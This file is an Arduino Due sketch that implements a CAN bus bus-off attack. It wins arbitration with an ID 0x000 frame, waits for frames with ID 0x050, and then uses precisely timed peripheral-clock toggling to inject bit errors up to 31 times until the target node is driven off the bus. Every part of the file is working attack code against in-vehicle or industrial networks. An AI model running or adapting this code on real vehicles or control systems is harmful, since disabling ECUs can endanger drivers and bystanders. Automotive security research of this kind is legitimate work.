#include <Arduino.h>
#include <due_can.h>
#include "variant.h"

#define NOP __asm__ __volatile__ ("nop\n\t")

#define WAIT_TIME 9.860 // in ms
#define REPEAT_TIME  163 // in us, affected by INJECT_LENGTH

CAN_FRAME outgoing;

volatile bool arbitrate; // indicates arbitration completion
volatile uint32_t counter; // indicates current bit count
volatile uint32_t num_inject; // indicates number of injections

// callback function for each bit time
void TC2_Handler(void) {

  // ensures proper timing and increases bit count
  TC_GetStatus(TC0, 2);
  counter++;

}

void TC3_Handler(void) {

  // ensures proper timing
  TC_GetStatus(TC1, 0);
  // bus-off right after arbitrate
#define MAX_INJECT 31
  while (num_inject < MAX_INJECT) {
    inject();
    delayMicroseconds(REPEAT_TIME);
  }
  // remove callback and clear out TX buffer
  Can0.removeGeneralCallback();
  pmc_enable_periph_clk(ID_CAN0);
  Can0.disable();

}

// callback function for receipt of any CAN message
void gotFrame(CAN_FRAME *frame) {

#define ARB_LENGTH 23 // id=0x000,dlc=0x8
  // enable timer ISRs
  NVIC_EnableIRQ(TC2_IRQn);
  NVIC_EnableIRQ(TC3_IRQn);
  // wait for bus idle and start arbitration
  Can0.sendFrame(outgoing);
  while (CAN0->CAN_SR & CAN_SR_RBSY);

  NOP; NOP; NOP;  NOP; NOP; NOP;  NOP; NOP; NOP;  NOP; NOP; NOP;

  TC_Start(TC0, 2);
  // arbitrate and wait until attack prepared
  while (counter < ARB_LENGTH);
  pmc_disable_periph_clk(ID_CAN0);
  TC_Start(TC1, 0);
}

void inject(void) {

#define INJECT_DELAY 5
#define INJECT_LENGTH 12 // +1 in reality, +1 here is -1 in REPEAT_TIME

  uint32_t attack = counter;
  PIO_Set(PIOB, PIO_PB27B_TIOB0);
  while (counter < attack + INJECT_DELAY);
  pmc_enable_periph_clk(ID_CAN0);
  while (counter < attack + INJECT_DELAY + 1);
  pmc_disable_periph_clk(ID_CAN0);
  while (counter < attack + INJECT_DELAY + INJECT_LENGTH);
  pmc_enable_periph_clk(ID_CAN0);
  while (counter < attack + INJECT_DELAY + INJECT_LENGTH + 1);
  pmc_disable_periph_clk(ID_CAN0);
  PIO_Clear(PIOB, PIO_PB27B_TIOB0);
  num_inject++;

}

void setup() {

#define SPEED CAN_BPS_500K

  // setup attack message
  outgoing.id = 0x000;
  outgoing.length = 8;  
  outgoing.extended = false;
  outgoing.data.value = 0x5555555555555555;

  // setup bit counter, number of injections and flags
  counter = 0;
  num_inject = 0;
  arbitrate = false;

  // setup timer, initialize CAN and start CAN interrupt
  setup_adc();
  setup_timer0_ch2();
  setup_timer1_ch0();
  Can0.init(SPEED);
  //  Can0.watchFor();
  for (int filter = 0; filter < 7; filter++) {
    Can0.setRXFilter(filter, 0x050, 0x7ff, false);
  }
  Can0.setGeneralCallback(gotFrame);
  
}

void loop() {
  while ((adc_get_status(ADC) & ADC_ISR_DRDY) != ADC_ISR_DRDY) {}; //Wait for end of conversion
  adc_get_latest_value(ADC); // Read ADC
}

// timer0_ch2 is first available timer intended for interrupt purposes
void setup_timer0_ch2() {

  // enables clock for timer0-channel2
  pmc_enable_periph_clk(ID_TC2);
  // setup timer0-channel2 to generate waveform, trigger on up, and scaled clock1 (MCK / 2)
  TC_Configure(TC0, 2, TC_CMR_WAVE | TC_CMR_WAVSEL_UP_RC | TC_CMR_TCCLKS_TIMER_CLOCK1);
  // set time to CLOCK1 / CAN_BPS
  TC_SetRC(TC0, 2, VARIANT_MCK / 2 / SPEED);
  // enable RC compare interrupt
  TC0->TC_CHANNEL[2].TC_IER = TC_IER_CPCS;
  // disable all other interrupts
  TC0->TC_CHANNEL[2].TC_IDR = ~TC_IER_CPCS;
  NVIC_SetPriority(TC2_IRQn, 0);

}

// timer1_ch0 is next available timer intended for interrupt purposes
void setup_timer1_ch0() {

  // enables clock for timer1-channel0
  pmc_enable_periph_clk(ID_TC3);
  // setup timer1-channel0 to generate waveform, trigger on up, and scaled clock1 (MCK / 2)
  TC_Configure(TC1, 0, TC_CMR_WAVE | TC_CMR_WAVSEL_UP_RC | TC_CMR_TCCLKS_TIMER_CLOCK1);
  // set time to CLOCK1 / CAN_BPS
  TC_SetRC(TC1, 0, int(float(VARIANT_MCK / 2 / ( 1000 / WAIT_TIME))));
  // enable RC compare interrupt
  TC1->TC_CHANNEL[0].TC_IER = TC_IER_CPCS;
  // disable all other interrupts
  TC1->TC_CHANNEL[0].TC_IDR = ~TC_IER_CPCS;
  NVIC_SetPriority(TC3_IRQn, 100);

}

void setup_adc() {
  
  pmc_enable_periph_clk(ID_ADC); // To use peripheral, we must enable clock distributon to it
  adc_init(ADC, SystemCoreClock, ADC_FREQ_MAX, ADC_STARTUP_FAST); // initialize, set maximum posibble speed
  adc_disable_interrupt(ADC, 0xFFFFFFFF);
  adc_set_resolution(ADC, ADC_12_BITS);
  adc_configure_power_save(ADC, 0, 0); // Disable sleep
  adc_configure_timing(ADC, 0, ADC_SETTLING_TIME_3, 1); // Set timings - standard values
  adc_set_bias_current(ADC, 1); // Bias current - maximum performance over current consumption
  adc_stop_sequencer(ADC); // not using it
  adc_disable_tag(ADC); // it has to do with sequencer, not using it
  adc_disable_ts(ADC); // disable temperature sensor
  adc_disable_channel_differential_input(ADC, ADC_CHANNEL_7);
  adc_configure_trigger(ADC, ADC_TRIG_SW, 1); // triggering from software, freerunning mode
  adc_disable_all_channel(ADC);
  adc_enable_channel(ADC, ADC_CHANNEL_7); // just one channel enabled
  adc_start(ADC);
  
}
